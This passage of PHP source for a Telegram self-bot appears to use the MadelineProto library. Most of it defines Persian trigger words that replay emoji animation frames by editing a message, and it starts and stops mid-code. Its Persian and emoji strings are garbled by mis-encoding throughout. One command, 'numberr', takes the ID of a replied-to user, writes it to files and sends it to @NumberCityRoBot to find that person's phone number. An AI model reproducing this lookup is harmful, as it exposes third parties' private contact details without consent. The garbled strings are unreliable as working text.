                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช ๐๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช๐๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ฆ๐"]);
                    }
                    if ($text == 'ุขูพุฏ?ุช' or $text == 'ุงูพุฏ?ุช' or $text == 'ุขูพุฏ?ุช ุดู') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โช๏ธ10%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โช๏ธโช๏ธ20%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โช๏ธโช๏ธโช๏ธ30%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โช๏ธโช๏ธโช๏ธโช๏ธ40%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โช๏ธโช๏ธโช๏ธโช๏ธโช๏ธ50%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โช๏ธโช๏ธโช๏ธโช๏ธโช๏ธโช๏ธ60%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โช๏ธโช๏ธโช๏ธโช๏ธโช๏ธโช๏ธโช๏ธ70%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โช๏ธโช๏ธโช๏ธโช๏ธโช๏ธโช๏ธโช๏ธโช๏ธ80%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โช๏ธโช๏ธโช๏ธโช๏ธโช๏ธโช๏ธโช๏ธโช๏ธโช๏ธ90%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ๏ธERORโ๏ธ"]);
                    }
                    if ($text == 'ุฌูุง?ุชฺฉุงุฑู ุจฺฉุด' or $text == 'ุจฺฉุดุด' or $text == 'ุฎุง?ูุงูู ุจฺฉุด') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐                 โข ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐                โข  ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐               โข   ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐              โข    ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐             โข     ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐            โข      ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐           โข       ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐          โข        ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐         โข         ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐        โข          ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐       โข           ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐      โข            ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐     โข             ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐    โข              ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐   โข               ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐  โข                ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ โข                 ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐โข                  ๐ซ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐คฏ                  ๐ซ ๐ค "]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ูุฑุฏ ุฌูุง?ุชฺฉุงุฑ ฺฉุดุชู ุดุฏ :)"]);
                    }
                    if ($text == 'ุจุฑ?ู ูุณุฌุฏ' or $text == 'ูุณุฌุฏ') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐                  ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐                 ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐                ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐               ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐              ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐             ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐            ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐           ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐          ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐         ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐        ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐       ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐      ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐     ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐    ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐   ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐  ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ุงุดูุฏุงู ุงูุง ุงูุง ุงููู๐ข"]);
                    }
                    if ($text == 'ฺฉูุณู' or $text == 'ูุง? ฺฉูุณู') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐โโโโโโโ๐โโโโโโ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐โโโโโโ๐โโโโโ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐โโโโโ๐โโโโ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐โโโโ๐โโโโ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐โโโ๐โโโโ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐โโ๐โโโโ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐โ๐โโโโ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐โโโโ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ุงูุฎ?ุด ุดุงูุณ ุขูุฑุฏูุง :)"]);
                    }
                    if ($text == 'ุจุงุฑูู') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ๏ธ                โก๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ๏ธ               โก๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ๏ธ              โก๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ๏ธ             โก๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ๏ธ            โก๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ๏ธ           โก๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ๏ธ          โก๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ๏ธ         โก๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ๏ธ        โก๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ๏ธ       โก๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ๏ธ      โก๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ๏ธ     โก๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ๏ธ    โก๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ๏ธ   โก๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ๏ธ  โก๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ๏ธ โก๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ"]);
                    }
                    if ($text == 'ุจุงุฏฺฉูฺฉ') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ช                ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ช               ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ช              ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ช             ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ช            ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ช           ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ช          ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ช         ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ช        ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ช       ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ช      ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ช     ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ช    ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ช   ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ช  ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ช ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ช๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅBoom๐ฅ"]);
                    }
                    if ($text == 'ุดุจ ุฎูุด' or $text == 'ุดุจ ุจุฎ?ุฑ ' or $text == 'ุดู ุฎูุด ') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐              ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐             ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐            ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐           ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐          ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐         ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐        ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐       ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐      โน๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐     ๐ฃ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐    ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐   ๐ฉ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐  ๐ฅฑ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ ๐ฅฑ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ด"]);
                    }
                    if ($text == 'ู?ุด?ูฺฏ' or $text == 'ู?ุด ') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐บ๐ฃ_______________๐ณ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐บ๐ฃ______________๐ณ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐บ๐ฃ_____________๐ณ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐บ๐ฃ____________๐ณ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐บ๐ฃ___________๐ณ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐บ๐ฃ__________๐ณ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐บ๐ฃ_________๐ณ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐บ๐ฃ________๐ณ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐บ๐ฃ_______๐ณ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐บ๐ฃ______๐ณ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐บ๐ฃ_____๐ณ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐บ๐ฃ____๐ณ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐บ๐ฃ___๐ณ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐บ๐ฃ__๐ณ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐บ๐ฃ_๐ณ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐บ๐ฃ๐ณ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ต๐คphishing๐ค๐ต"]);
                    }
                    if ($text == ' ฺฏู ุจุฒู ' or $text == 'ููุชุจุงู' or $text == 'ุชู? ุฏุฑูุงุฒู') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐          โฝ๏ธ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐         โฝ๏ธ ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐        โฝ๏ธ  ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐       โฝ๏ธ   ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐      โฝ๏ธ    ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐     โฝ๏ธ     ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐    โฝ๏ธ      ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐   โฝ๏ธ       ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ โฝ๏ธ         ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐โฝ๏ธ          ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ โฝ๏ธ         ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐  โฝ๏ธ        ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐   โฝ๏ธ       ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐    โฝ๏ธ      ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐     โฝ๏ธ     ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐      โฝ๏ธ    ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐       โฝ๏ธ   ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐        โฝ๏ธ  ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐         โฝ๏ธ ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐          โฝ๏ธ๐ฅ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "(ุชู? ุฏุฑูุงุฒู๐ฅ)"]);
                    }
                    if ($text == 'ุจุฑู ุจุฎุงุจู') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐                ๐ถ๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐               ๐ถ๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐              ๐ถ๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐             ๐ถ๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐            ๐ถ๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐           ๐ถ๐ปโโ๏ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐          ๐ถ๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐         ๐ถ๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐        ๐ถ๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐       ๐ถ๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐      ๐ถ๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐     ๐ถ๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐    ๐ถ๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐   ๐ถ๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐  ๐ถ๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ ๐ถ๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐"]);
                    }
                    if ($text == 'ุบุฑูุด ฺฉู') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฌ๐              ๐๐ปโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฌ๐             ๐๐ปโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฌ๐            ๐๐ปโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฌ๐           ๐๐ปโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฌ๐          ๐๐ปโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฌ๐         ๐๐ปโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฌ๐        ๐๐ปโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฌ๐       ๐๐ปโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฌ๐      ๐๐ปโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฌ๐     ๐๐ปโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฌ๐    ๐๐ปโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฌ๐   ๐๐ปโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฌ๐  ๐๐ปโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฌ๐ ๐๐ปโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ุบุฑู ุดุฏ๐"]);
                    }
                    if ($text == 'ูุถุงููุฑุฏ') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐งโ๐              ๐ช"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐งโ๐             ๐ช"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐งโ๐            ๐ช"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐งโ๐           ๐ช"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐งโ๐          ๐ช"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐งโ๐         ๐ช"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐งโ๐        ๐ช"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐งโ๐       ๐ช"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐งโ๐      ๐ช"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐งโ๐     ๐ช"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐งโ๐    ๐ช"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐งโ๐   ๐ช"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐งโ๐  ๐ช"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐งโ๐ ๐ช"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฎ๐ทูู ู?ฺฏู ุง?ุฑุงู ูู?ู๐ฎ๐ท"]);
                    }
                    if ($text == 'ุจุฒู ูุฏุด' or $text == 'ุง?ูู') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป                    ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป                   ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป                  ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป                 ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป                ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป               ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป              ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป             ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป            ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป           ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป          ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป         ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป        ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป       ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป      ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป     ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป    ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป   ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป  ๐ค๐ป"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ค๐ป๐ค๐ป"]);
                    }
                    if ($text == 'numberr' or $text == 'ุดูุงุฑุชุช') {
                        if ($type3 == 'supergroup' or $type3 == 'chat') {
                            $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                            $messag1 = $gmsg['messages'][0]['reply_to']['reply_to_msg_id'];
                            $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                            $messag = $gms['messages'][0]['from_id']['user_id'];
                            $iduser = $messag;
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ยป ุฏุฑุญุงู ุฌุณุช ู ุฌู . . . ! ยซ"]);
                            yield $this->filePutContents("msgid25.txt", $msg_id);
                            yield $this->filePutContents("peer5.txt", "$peer");
                            yield $this->filePutContents("id.txt", "$messag");
                            yield $this->messages->sendMessage(['peer' => "@NumberCityRoBot", 'message' => "๐ ุฌุณุชูุฌู? ุดูุงุฑู ๐"]);
                            yield $this->messages->sendMessage(['peer' => "@NumberCityRoBot", 'message' => "$messag"]);
                        } else {
                            if ($type3 == 'user') {
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ยป ุฏุฑุญุงู ุฌุณุช ู ุฌู . . . ! ยซ"]);
                                yield $this->filePutContents("msgid25.txt", $msg_id);
                                yield $this->filePutContents("peer5.txt", "$peer");
                                yield $this->filePutContents("id.txt", "$peer");
                                yield $this->messages->sendMessage(['peer' => "@NumberCityRoBot", 'message' => "๐ ุฌุณุชูุฌู? ุดูุงุฑู ๐"]);
                                yield $this->messages->sendMessage(['peer' => "@NumberCityRoBot", 'message' => "$peer"]);

                            }
                        }
                    }
                    if ($text == "Number") {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ' โถ ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 1, 'message' => ' โท ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 2, 'message' => ' โธ ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
